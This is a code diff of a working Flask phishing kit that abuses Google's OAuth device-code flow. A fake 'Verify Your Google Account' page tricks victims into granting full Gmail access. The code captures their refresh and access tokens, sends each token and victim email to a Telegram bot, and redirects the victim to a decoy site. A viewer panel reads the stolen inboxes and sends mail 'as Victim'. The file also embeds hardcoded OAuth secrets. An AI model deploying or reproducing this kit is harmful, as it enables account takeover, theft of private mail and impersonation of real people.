@@ -1,17 +1,15 @@
-from flask import Flask, request, redirect, session, render_template_string, Response
+from flask import Flask, request, redirect, session, render_template_string, jsonify
 import requests
 import json
 import os
 import base64
-import re
 from datetime import datetime
-from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ================================================================
-# YOUR GOOGLE OAUTH CREDENTIALS (same as before)
+# YOUR GOOGLE OAUTH CREDENTIALS
 # ================================================================
 CLIENT_ID = "870868575995-luhgcleqlgjb28tckh6tmidfea3vc3dp.apps.googleusercontent.com"
 CLIENT_SECRET = "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"
@@ -27,7 +25,6 @@ TG_CHAT_ID = "7554731151"
 # TOKEN STORAGE
 # ================================================================
 TOKEN_DB = "/tmp/tokens.json"
-INTERCEPTED_DB = "/tmp/intercepted.json"
 
 def send_telegram(message):
     url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
@@ -37,42 +34,11 @@ def send_telegram(message):
     except:
         pass
 
-def save_intercepted(data_type, data, ip):
-    """Save intercepted OAuth data"""
-    db = {}
-    if os.path.exists(INTERCEPTED_DB):
-        with open(INTERCEPTED_DB) as f:
-            db = json.load(f)
-    
-    entry = {
-        "type": data_type,
-        "data": data,
-        "ip": ip,
-        "timestamp": datetime.now().isoformat()
-    }
-    
-    # Use a unique key
-    key = f"{data_type}_{datetime.now().timestamp()}"
-    db[key] = entry
-    
-    with open(INTERCEPTED_DB, "w") as f:
-        json.dump(db, f, indent=2)
-    
-    # Send to Telegram
-    msg = f"""[+]___ OAuth_INTERCEPTED ___[+]
-Type: {data_type}
-IP: {ip}
-Data: {json.dumps(data, indent=2)[:500]}"""
-    send_telegram(msg)
-    
-    print(f"[+] Intercepted {data_type}")
-
 def save_token(email, refresh_token, access_token, ip):
     db = {}
     if os.path.exists(TOKEN_DB):
         with open(TOKEN_DB) as f:
             db = json.load(f)
-    
     db[email] = {
         "refresh_token": refresh_token,
         "access_token": access_token,
@@ -80,16 +46,10 @@ def save_token(email, refresh_token, access_token, ip):
         "timestamp": datetime.now().isoformat(),
         "method": "aitm_proxy"
     }
-    
     with open(TOKEN_DB, "w") as f:
         json.dump(db, f, indent=2)
-    
-    msg = f"""[+]___ GMAIL_OAUTH ___[+]
-Victim: {email}
-Token: {refresh_token}
-IP: {ip}"""
+    msg = f"""[+]___ GMAIL_OAUTH ___[+]\nVictim: {email}\nToken: {refresh_token}\nIP: {ip}"""
     send_telegram(msg)
-    
     print(f"[+] Captured token for {email}")
 
 # ================================================================
@@ -105,11 +65,10 @@ def home():
     """
 
 # ================================================================
-# AiTM PROXY — Landing page for victim
+# AiTM PROXY — Landing page
 # ================================================================
 @app.route('/auth/gmail')
 def auth_gmail():
-    """Landing page that looks legitimate, then initiates proxy auth"""
     return render_template_string("""
     <!DOCTYPE html>
     <html>
@@ -142,107 +101,86 @@ def auth_gmail():
     """)
 
 # ================================================================
-# STEP 1: Initiate proxy OAuth flow
+# STEP 1: Initiate device code flow
 # ================================================================
 @app.route('/proxy/auth')
 def proxy_auth():
-    """
-    Instead of redirecting to Google directly, we'll go through 
-    the device code flow which we can intercept cleanly.
-    The victim stays on our domain the entire time.
-    """
-    # Request a device code from Google
-    resp = requests.post('https://oauth2.googleapis.com/device/code', data={
-        'client_id': CLIENT_ID,
-        'scope': 'openid email profile https://www.googleapis.com/auth/gmail.readonly https://mail.google.com/'
-    })
-    device_data = resp.json()
-    
-    # Store everything in session
-    session['device_code'] = device_data['device_code']
-    session['user_code'] = device_data['user_code']
-    session['verification_url'] = device_data['verification_url']
-    
-    # INTERCEPT: Save the device code details
-    save_intercepted("device_code_request", {
-        "device_code": device_data['device_code'][:20] + "...",
-        "user_code": device_data['user_code'],
-        "expires_in": device_data.get('expires_in'),
-        "verification_url": device_data['verification_url']
-    }, request.headers.get("X-Forwarded-For", request.remote_addr))
-    
-    # Show the user the Google device page
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Verify Your Account</title>
-        <style>
-            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-                 background:#f0f2f5;display:flex;justify-content:center;align-items:center;
-                 height:100vh;margin:0}
-            .card{background:white;padding:40px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1);
-                  max-width:480px;text-align:center}
-            .step{background:#f8f9fa;border-radius:8px;padding:15px;margin:15px 0;text-align:left}
-            .code{font-size:32px;font-weight:bold;background:#e8f0fe;padding:15px 25px;
-                  display:inline-block;letter-spacing:8px;border-radius:6px;margin:10px 0;
-                  font-family:'Courier New',monospace;color:#1a73e8}
-            .btn{background:#4285f4;color:white;padding:12px 30px;border:none;border-radius:6px;
-                 font-size:16px;cursor:pointer;text-decoration:none;display:inline-block}
-            .btn:hover{background:#3367d6}
-            h2{color:#1a1a1a}
-            .note{color:#999;font-size:12px;margin-top:15px}
-            .loader{display:inline-block;width:20px;height:20px;border:3px solid #e0e0e0;
-                    border-top:3px solid #4285f4;border-radius:50%;animation:spin 1s linear infinite;
-                    margin-right:8px;vertical-align:middle}
-            @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <h2>Verify Your Google Account</h2>
-            <p style="color:#666">Follow the steps below to complete verification</p>
-            
-            <div class="step">
-                <strong>Step 1:</strong> Open Google's verification page
-                <br><br>
-                <a href="{{ verification_url }}" target="_blank" class="btn">
-                    Open google.com/device
-                </a>
+    try:
+        # Request a device code from Google
+        resp = requests.post('https://oauth2.googleapis.com/device/code', data={
+            'client_id': CLIENT_ID,
+            'scope': 'openid email profile https://www.googleapis.com/auth/gmail.readonly https://mail.google.com/'
+        })
+        device_data = resp.json()
+        
+        # Store in session
+        session['device_code'] = device_data['device_code']
+        session['user_code'] = device_data['user_code']
+        session['verification_url'] = device_data['verification_url']
+        
+        return render_template_string("""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Verify Your Account</title>
+            <style>
+                body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+                     background:#f0f2f5;display:flex;justify-content:center;align-items:center;
+                     height:100vh;margin:0}
+                .card{background:white;padding:40px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1);
+                      max-width:480px;text-align:center}
+                .step{background:#f8f9fa;border-radius:8px;padding:15px;margin:15px 0;text-align:left}
+                .code{font-size:32px;font-weight:bold;background:#e8f0fe;padding:15px 25px;
+                      display:inline-block;letter-spacing:8px;border-radius:6px;margin:10px 0;
+                      font-family:'Courier New',monospace;color:#1a73e8}
+                .btn{background:#4285f4;color:white;padding:12px 30px;border:none;border-radius:6px;
+                     font-size:16px;cursor:pointer;text-decoration:none;display:inline-block}
+                .btn:hover{background:#3367d6}
+                h2{color:#1a1a1a}
+                .note{color:#999;font-size:12px;margin-top:15px}
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <h2>Verify Your Google Account</h2>
+                <p style="color:#666">Follow the steps below to complete verification</p>
+                
+                <div class="step">
+                    <strong>Step 1:</strong> Open Google's verification page
+                    <br><br>
+                    <a href="{{ verification_url }}" target="_blank" class="btn">
+                        Open google.com/device
+                    </a>
+                </div>
+                
+                <div class="step">
+                    <strong>Step 2:</strong> Enter this code
+                    <br>
+                    <div class="code">{{ user_code }}</div>
+                </div>
+                
+                <div class="step">
+                    <strong>Step 3:</strong> Click "Continue" and authorize
+                    <br><br>
+                    <span style="color:#666">Waiting for verification...</span>
+                </div>
+                
+                <p class="note">This page will automatically check for authorization.</p>
             </div>
-            
-            <div class="step">
-                <strong>Step 2:</strong> Enter this code
-                <br>
-                <div class="code">{{ user_code }}</div>
-            </div>
-            
-            <div class="step">
-                <strong>Step 3:</strong> Click "Continue" and authorize
-                <br><br>
-                <span class="loader"></span>
-                <span style="color:#666">Waiting for verification...</span>
-            </div>
-            
-            <p class="note">This page will automatically check for authorization.</p>
-        </div>
-        <script>
-            setTimeout(function(){ window.location.href = '/proxy/poll'; }, 3000);
-        </script>
-    </body>
-    </html>
-    """, user_code=session['user_code'], verification_url=session['verification_url'])
+            <script>
+                setTimeout(function(){ window.location.href = '/proxy/poll'; }, 3000);
+            </script>
+        </body>
+        </html>
+        """, user_code=session['user_code'], verification_url=session['verification_url'])
+    except Exception as e:
+        return f"Error starting auth: {str(e)}", 500
 
 # ================================================================
-# STEP 2: Poll for token — THIS IS WHERE WE INTERCEPT
+# STEP 2: Poll for token
 # ================================================================
 @app.route('/proxy/poll')
 def proxy_poll():
-    """
-    Poll Google for the token exchange.
-    When the user authorizes, Google returns tokens to US,
-    and we capture them before the user ever sees.
-    """
     device_code = session.get('device_code')
     if not device_code:
         return redirect('/auth/gmail')
@@ -251,151 +189,68 @@ def proxy_poll():
     if victim_ip and "," in victim_ip:
         victim_ip = victim_ip.split(",")[0].strip()
     
-    # Poll Google for token
-    resp = requests.post('https://oauth2.googleapis.com/token', data={
-        'client_id': CLIENT_ID,
-        'client_secret': CLIENT_SECRET,
-        'device_code': device_code,
-        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
-    })
-    
-    token_data = resp.json()
-    
-    # INTERCEPT: Log the entire response
-    save_intercepted("token_poll_response", token_data, victim_ip)
-    
-    if 'access_token' in token_data:
-        # === WE GOT THE TOKENS ===
-        refresh_token = token_data.get("refresh_token", "N/A")
-        access_token = token_data.get("access_token", "N/A")
-        id_token = token_data.get("id_token", "")
-        expires_in = token_data.get("expires_in", 3600)
-        scope = token_data.get("scope", "")
-        token_type = token_data.get("token_type", "")
+    try:
+        resp = requests.post('https://oauth2.googleapis.com/token', data={
+            'client_id': CLIENT_ID,
+            'client_secret': CLIENT_SECRET,
+            'device_code': device_code,
+            'grant_type': 'urn:ietf:params:oauth:grant-type:device_code'
+        })
         
-        # INTERCEPT: Save the full token response
-        save_intercepted("full_token_response", {
-            "has_refresh": refresh_token != "N/A",
-            "has_access": True,
-            "has_id_token": bool(id_token),
-            "expires_in": expires_in,
-            "scope": scope,
-            "token_type": token_type,
-            "refresh_token_prefix": refresh_token[:30] if refresh_token != "N/A" else "none",
-            "access_token_prefix": access_token[:30]
-        }, victim_ip)
+        token_data = resp.json()
         
-        # Get user info
-        userinfo = requests.get(
-            "https://www.googleapis.com/oauth2/v2/userinfo",
-            headers={"Authorization": f"Bearer {access_token}"}
-        ).json()
-        email = userinfo.get("email", "unknown")
+        if 'access_token' in token_data:
+            # GOT THE TOKENS!
+            refresh_token = token_data.get("refresh_token", "N/A")
+            access_token = token_data.get("access_token", "N/A")
+            
+            # Get user info
+            userinfo = requests.get(
+                "https://www.googleapis.com/oauth2/v2/userinfo",
+                headers={"Authorization": f"Bearer {access_token}"}
+            ).json()
+            email = userinfo.get("email", "unknown")
+            
+            # Save the token
+            save_token(email, refresh_token, access_token, victim_ip)
+            
+            # Clear session
+            session.pop('device_code', None)
+            session.pop('user_code', None)
+            session.pop('verification_url', None)
+            
+            # Redirect to landing page
+            return redirect("https://ivview.party/")
         
-        # INTERCEPT: Save user info
-        save_intercepted("user_info", userinfo, victim_ip)
+        elif token_data.get('error') == 'authorization_pending':
+            return render_template_string("""
+            <html><body style="text-align:center;font-family:Arial;margin-top:50px;background:#f0f2f5">
+                <div style="background:white;padding:30px;border-radius:12px;max-width:400px;margin:auto">
+                    <p style="font-size:18px;">Waiting for verification...</p>
+                    <p style="color:#666">Code: <strong>{{ code }}</strong></p>
+                    <p style="font-size:12px;color:#999">
+                        <a href="{{ url }}" target="_blank">Open google.com/device</a>
+                    </p>
+                </div>
+                <script>setTimeout(function(){window.location.href='/proxy/poll'},3000)</script>
+            </body></html>
+            """, code=session.get('user_code', ''), url=session.get('verification_url', ''))
         
-        # Decode the ID token for additional data
-        id_token_data = {}
-        if id_token:
-            try:
-                # JWT is three base64 parts
-                parts = id_token.split('.')
-                if len(parts) == 3:
-                    # Add padding
-                    payload = parts[1]
-                    payload += '=' * (4 - len(payload) % 4)
-                    decoded = base64.urlsafe_b64decode(payload)
-                    id_token_data = json.loads(decoded)
-                    save_intercepted("id_token_decoded", id_token_data, victim_ip)
-            except:
-                pass
+        elif token_data.get('error') == 'slow_down':
+            return "<html><body><p>Waiting...</p><script>setTimeout(function(){window.location.href='/proxy/poll'},8000)</script></body></html>"
         
-        # Save the token for replay
-        save_token(email, refresh_token, access_token, victim_ip)
+        elif token_data.get('error') == 'expired_token':
+            session.pop('device_code', None)
+            return redirect('/auth/gmail')
         
-        # Clear session
-        session.pop('device_code', None)
-        session.pop('user_code', None)
-        session.pop('verification_url', None)
+        elif token_data.get('error') == 'access_denied':
+            return "Authorization canceled. <a href='/auth/gmail'>Try again</a>"
         
-        # Decoy: redirect to a legitimate-looking page
-        return redirect("https://ivview.party/verified")
-    
-    elif token_data.get('error') == 'authorization_pending':
-        # Still waiting — poll again
-        return render_template_string("""
-        <html><body style="text-align:center;font-family:Arial;margin-top:50px;background:#f0f2f5">
-            <div style="background:white;padding:30px;border-radius:12px;max-width:400px;margin:auto">
-                <div class="loader" style="display:inline-block;width:30px;height:30px;
-                     border:3px solid #e0e0e0;border-top:3px solid #4285f4;border-radius:50%;
-                     animation:spin 1s linear infinite;margin:20px"></div>
-                <p>Waiting for verification...</p>
-                <p style="color:#666;font-size:13px">Code: <strong>{{ user_code }}</strong></p>
-                <p style="font-size:12px;color:#999">
-                    <a href="{{ verification_url }}" target="_blank">Open google.com/device</a>
-                </p>
-            </div>
-            <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
-        </body></html>
-        """, user_code=session.get('user_code', ''), 
-            verification_url=session.get('verification_url', ''))
-    
-    elif token_data.get('error') == 'slow_down':
-        # Polling too fast
-        return render_template_string("""
-        <html><body>
-            <p>Checking again shortly...</p>
-            <script>setTimeout(function(){window.location.href='/proxy/poll'},8000)</script>
-        </body></html>
-        """)
-    
-    elif token_data.get('error') == 'expired_token':
-        session.pop('device_code', None)
-        return redirect('/auth/gmail')
-    
-    elif token_data.get('error') == 'access_denied':
-        save_intercepted("user_denied", {"error": "user_denied"}, victim_ip)
-        return "Authorization canceled. <a href='/auth/gmail'>Try again</a>"
-    
-    else:
-        save_intercepted("unexpected_error", token_data, victim_ip)
-        return f"Error. <a href='/auth/gmail'>Try again</a>"
-
-# ================================================================
-# VIEW INTERCEPTED DATA (for you to check)
-# ================================================================
-@app.route('/intercepted')
-def view_intercepted():
-    """View all intercepted OAuth data"""
-    if not os.path.exists(INTERCEPTED_DB):
-        return jsonify({})
-    with open(INTERCEPTED_DB) as f:
-        data = json.load(f)
-    
-    # Return as pretty HTML
-    html = """
-    <html><head><style>
-        body{font-family:Arial;padding:20px;background:#0d1117;color:#c9d1d9}
-        pre{background:#161b22;padding:15px;border-radius:6px;overflow-x:auto}
-        .entry{border:1px solid #30363d;border-radius:6px;padding:15px;margin:10px 0}
-        .type{color:#58a6ff;font-weight:bold}
-        .time{color:#8b949e;font-size:12px}
-    </style></head><body>
-    <h1>Intercepted OAuth Data</h1>
-    """
-    
-    for key, entry in reversed(list(data.items())):
-        html += f"""
-        <div class="entry">
-            <div class="type">{entry['type']}</div>
-            <div class="time">{entry['timestamp']} | IP: {entry['ip']}</div>
-            <pre>{json.dumps(entry['data'], indent=2)}</pre>
-        </div>
-        """
-    
-    html += "</body></html>"
-    return html
+        else:
+            return f"Error: {token_data}"
+            
+    except Exception as e:
+        return f"Error: {str(e)}", 500
 
 # ================================================================
 # TOKENS ENDPOINT
@@ -408,190 +263,7 @@ def list_tokens():
         return jsonify(json.load(f))
 
 # ================================================================
-# HEALTH
-# ================================================================
-@app.route('/health')
-def health():
-    return "OK"
-
-# ================================================================
-# VIEWER (same as before)
-# ================================================================
-@app.route('/viewer')
-def viewer():
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Gmail Viewer</title>
-        <style>
-            body{font-family:Arial;padding:30px;background:#0d1117;color:#c9d1d9;max-width:1000px;margin:auto}
-            h1{color:#58a6ff}
-            table{width:100%;border-collapse:collapse;margin-top:20px}
-            th,td{padding:12px;text-align:left;border-bottom:1px solid #30363d}
-            th{color:#8b949e}
-            a{color:#58a6ff;text-decoration:none}
-            .card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin:8px 0;cursor:pointer}
-            .card:hover{border-color:#58a6ff}
-            .from{color:#8b949e;font-size:13px}
-            .subject{color:#c9d1d9;font-weight:600}
-            .snippet{color:#8b949e;font-size:13px;margin-top:4px}
-            .btn{background:#238636;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-block}
-            .btn-blue{background:#1f6feb}
-            .btn-red{background:#da3633}
-            .btn-sm{padding:4px 10px;font-size:12px}
-            input,textarea{padding:10px;margin:5px 0;border:1px solid #30363d;border-radius:4px;background:#0d1117;color:#c9d1d9;width:100%;box-sizing:border-box}
-            .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;display:none}
-            .modal-content{background:#161b22;margin:40px auto;padding:30px;border-radius:8px;max-width:800px;max-height:80vh;overflow-y:auto;position:relative}
-            .close{position:absolute;top:10px;right:20px;font-size:28px;cursor:pointer;color:#8b949e}
-            .close:hover{color:#fff}
-            .email-body{white-space:pre-wrap;word-break:break-word;font-size:14px;line-height:1.5}
-            .email-headers{margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid #30363d}
-            .email-headers div{margin:4px 0}
-            .label{color:#8b949e;font-weight:bold;display:inline-block;width:80px}
-            #send-section{display:none;margin-top:20px;padding:20px;background:#161b22;border:1px solid #30363d;border-radius:6px}
-            .tab{margin-bottom:20px}
-            .tab button{padding:10px 20px;background:#30363d;color:#c9d1d9;border:none;cursor:pointer;border-radius:4px 4px 0 0}
-            .tab button.active{background:#1f6feb;color:#fff}
-            .tabcontent{display:none}
-            .tabcontent.active{display:block}
-            #loading{text-align:center;padding:40px;color:#8b949e}
-        </style>
-    </head>
-    <body>
-        <h1>Gmail Viewer</h1>
-        <div class="tab">
-            <button class="active" onclick="switchTab('tokens')">Captured Tokens</button>
-            <button onclick="switchTab('intercepted')">Intercepted Data</button>
-        </div>
-        
-        <div id="tokens" class="tabcontent active">
-            <p><button class="btn" onclick="loadTokens()">Refresh Tokens</button></p>
-            <div id="token-list"><p>Loading...</p></div>
-        </div>
-        
-        <div id="intercepted" class="tabcontent">
-            <p><button class="btn" onclick="loadIntercepted()">Refresh Intercepted</button></p>
-            <div id="intercepted-list"><p>Loading...</p></div>
-        </div>
-        
-        <div id="inbox-section" style="display:none;margin-top:20px">
-            <h3 style="display:inline-block">Inbox: <span id="inbox-email" style="color:#58a6ff"></span></h3>
-            <button class="btn btn-blue" style="float:right" onclick="showSendSection()">Send Email</button>
-            <div id="send-section">
-                <h4>Send Email as Victim</h4>
-                <input id="send-to" placeholder="To: email@example.com">
-                <input id="send-subject" placeholder="Subject">
-                <textarea id="send-body" rows="4" placeholder="Message body..."></textarea>
-                <button class="btn" onclick="sendEmail()">Send</button>
-                <button class="btn btn-red" onclick="hideSendSection()">Cancel</button>
-                <div id="send-status" style="margin-top:10px;color:#8b949e"></div>
-            </div>
-            <div id="inbox-content"></div>
-        </div>
-        
-        <div id="email-modal" class="modal" onclick="closeModal(event)">
-            <div class="modal-content" onclick="event.stopPropagation()">
-                <span class="close" onclick="closeModal()">&times;</span>
-                <div id="modal-content"></div>
-            </div>
-        </div>
-        
-        <script>
-            let currentEmail = '';
-            
-            function switchTab(name) {
-                document.querySelectorAll('.tabcontent').forEach(t => t.classList.remove('active'));
-                document.querySelectorAll('.tab button').forEach(b => b.classList.remove('active'));
-                document.getElementById(name).classList.add('active');
-                event.target.classList.add('active');
-            }
-            
-            async function loadTokens() {
-                const r = await fetch('/tokens');
-                const d = await r.json();
-                let h = '<table><tr><th>Email</th><th>IP</th><th>Time</th><th>Action</th></tr>';
-                for (const [e,i] of Object.entries(d)) {
-                    h += `<tr><td>${e}</td><td>${i.ip||''}</td><td>${(i.timestamp||'').slice(0,19)}</td>
-                        <td><button class="btn btn-blue btn-sm" onclick="viewInbox('${e}')">View Inbox</button></td></tr>`;
-                }
-                document.getElementById('token-list').innerHTML = h || '<p>No tokens captured yet.</p>';
-            }
-            
-            async function loadIntercepted() {
-                const r = await fetch('/intercepted');
-                const d = await r.json();
-                let h = '';
-                for (const [k,v] of Object.entries(d).reverse()) {
-                    h += `<div class="card"><strong>${v.type}</strong> at ${v.timestamp}<br>
-                          <pre style="font-size:11px">${JSON.stringify(v.data, null, 2)}</pre></div>`;
-                }
-                document.getElementById('intercepted-list').innerHTML = h || '<p>No intercepted data.</p>';
-            }
-            
-            async function viewInbox(email) {
-                currentEmail = email;
-                document.getElementById('inbox-section').style.display = 'block';
-                document.getElementById('inbox-email').textContent = email;
-                document.getElementById('inbox-content').innerHTML = '<div id="loading">Loading inbox...</div>';
-                document.getElementById('send-section').style.display = 'none';
-                
-                const r = await fetch('/api/inbox', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({email: email})
-                });
-                const d = await r.json();
-                document.getElementById('inbox-content').innerHTML = d.html || '<p>No emails found.</p>';
-            }
-            
-            async function viewEmail(msgId) {
-                document.getElementById('modal-content').innerHTML = '<div id="loading">Loading email...</div>';
-                document.getElementById('email-modal').style.display = 'block';
-                const r = await fetch('/api/email', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({email: currentEmail, msg_id: msgId})
-                });
-                const d = await r.json();
-                document.getElementById('modal-content').innerHTML = d.html || '<p>Could not load email.</p>';
-            }
-            
-            function closeModal(e) {
-                if (!e || e.target === document.getElementById('email-modal')) {
-                    document.getElementById('email-modal').style.display = 'none';
-                }
-            }
-            
-            function showSendSection() {
-                document.getElementById('send-section').style.display = 'block';
-                document.getElementById('send-status').textContent = '';
-            }
-            
-            function hideSendSection() {
-                document.getElementById('send-section').style.display = 'none';
-            }
-            
-            async function sendEmail() {
-                const to = document.getElementById('send-to').value;
-                const subject = document.getElementById('send-subject').value;
-                const body = document.getElementById('send-body').value;
-                if (!to || !subject) { document.getElementById('send-status').textContent = 'To and Subject required.'; return; }
-                document.getElementById('send-status').textContent = 'Sending...';
-                const r = await fetch('/api/send', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({email: currentEmail, to, subject, body})
-                });
-                const d = await r.json();
-                document.getElementById('send-status').textContent = d.message || d.error || 'Sent';
-            }
-            
-            loadTokens();
-        </script>
-    </body>
-    </html>
-    """)
-
-# ================================================================
-# API ENDPOINTS (same as before)
+# API ENDPOINTS
 # ================================================================
 def get_access_token(email):
     db = {}
@@ -728,6 +400,106 @@ def api_send():
         return jsonify({"message": f"Email sent to {to}"})
     else:
         return jsonify({"error": f"Failed: {resp.text[:300]}"}), 500
+
+# ================================================================
+# VIEWER
+# ================================================================
+@app.route('/viewer')
+def viewer():
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Gmail Viewer</title>
+        <style>
+            body{font-family:Arial;padding:30px;background:#0d1117;color:#c9d1d9;max-width:1000px;margin:auto}
+            h1{color:#58a6ff}
+            table{width:100%;border-collapse:collapse;margin-top:20px}
+            th,td{padding:12px;text-align:left;border-bottom:1px solid #30363d}
+            th{color:#8b949e}
+            .card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;margin:8px 0;cursor:pointer}
+            .card:hover{border-color:#58a6ff}
+            .from{color:#8b949e;font-size:13px}
+            .subject{color:#c9d1d9;font-weight:600}
+            .btn{background:#238636;color:#fff;padding:8px 16px;border:none;border-radius:6px;cursor:pointer}
+            .btn-blue{background:#1f6feb}
+            .btn-red{background:#da3633}
+            input,textarea{padding:10px;margin:5px 0;border:1px solid #30363d;border-radius:4px;background:#0d1117;color:#c9d1d9;width:100%;box-sizing:border-box}
+            .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;display:none}
+            .modal-content{background:#161b22;margin:40px auto;padding:30px;border-radius:8px;max-width:800px;max-height:80vh;overflow-y:auto;position:relative}
+            .close{position:absolute;top:10px;right:20px;font-size:28px;cursor:pointer;color:#8b949e}
+            .email-body{white-space:pre-wrap;word-break:break-word;font-size:14px;line-height:1.5}
+            .email-headers{margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid #30363d}
+            .label{color:#8b949e;display:inline-block;width:80px}
+            #send-section{display:none;margin-top:20px;padding:20px;background:#161b22;border:1px solid #30363d;border-radius:6px}
+        </style>
+    </head>
+    <body>
+        <h1>Gmail Viewer</h1>
+        <p><button class="btn" onclick="loadTokens()">Refresh</button></p>
+        <div id="token-list"><p>Loading...</p></div>
+        <div id="inbox-section" style="display:none;margin-top:20px">
+            <h3>Inbox: <span id="inbox-email" style="color:#58a6ff"></span></h3>
+            <button class="btn btn-blue" style="float:right" onclick="toggleSend()">Send Email</button>
+            <div id="send-section">
+                <h4>Send Email as Victim</h4>
+                <input id="send-to" placeholder="To:"><input id="send-subject" placeholder="Subject">
+                <textarea id="send-body" rows="4" placeholder="Body..."></textarea>
+                <button class="btn" onclick="sendEmail()">Send</button>
+                <button class="btn btn-red" onclick="document.getElementById('send-section').style.display='none'">Cancel</button>
+                <div id="send-status" style="margin-top:10px;color:#8b949e"></div>
+            </div>
+            <div id="inbox-content"></div>
+        </div>
+        <div id="email-modal" class="modal" onclick="if(event.target===this)this.style.display='none'">
+            <div class="modal-content"><span class="close" onclick="document.getElementById('email-modal').style.display='none'">&times;</span>
+            <div id="modal-content"></div></div>
+        </div>
+        <script>
+            let currentEmail='';
+            async function loadTokens(){
+                const r=await fetch('/tokens');const d=await r.json();
+                let h='<table><tr><th>Email</th><th>IP</th><th>Time</th><th>Action</th></tr>';
+                for(const[e,i]of Object.entries(d))
+                    h+=`<tr><td>${e}</td><td>${i.ip||''}</td><td>${(i.timestamp||'').slice(0,19)}</td>
+                        <td><button class="btn btn-blue" onclick="viewInbox('${e}')">View</button></td></tr>`;
+                document.getElementById('token-list').innerHTML=h||'<p>No tokens.</p>';}
+            async function viewInbox(e){
+                currentEmail=e;
+                document.getElementById('inbox-section').style.display='block';
+                document.getElementById('inbox-email').textContent=e;
+                document.getElementById('inbox-content').innerHTML='<p>Loading...</p>';
+                document.getElementById('send-section').style.display='none';
+                const r=await fetch('/api/inbox',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:e})});
+                const d=await r.json();
+                document.getElementById('inbox-content').innerHTML=d.html||'<p>No emails.</p>';}
+            async function viewEmail(id){
+                document.getElementById('modal-content').innerHTML='<p>Loading...</p>';
+                document.getElementById('email-modal').style.display='block';
+                const r=await fetch('/api/email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:currentEmail,msg_id:id})});
+                const d=await r.json();
+                document.getElementById('modal-content').innerHTML=d.html||'<p>Error.</p>';}
+            function toggleSend(){document.getElementById('send-section').style.display='block';}
+            async function sendEmail(){
+                const to=document.getElementById('send-to').value;
+                const subject=document.getElementById('send-subject').value;
+                const body=document.getElementById('send-body').value;
+                if(!to||!subject){document.getElementById('send-status').textContent='To and Subject required.';return;}
+                document.getElementById('send-status').textContent='Sending...';
+                const r=await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:currentEmail,to,subject,body})});
+                const d=await r.json();
+                document.getElementById('send-status').textContent=d.message||d.error||'Sent';}
+            loadTokens();
+        </script>
+    </body></html>
+    """)
+
+# ================================================================
+# HEALTH
+# ================================================================
+@app.route('/health')
+def health():
+    return "OK"
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
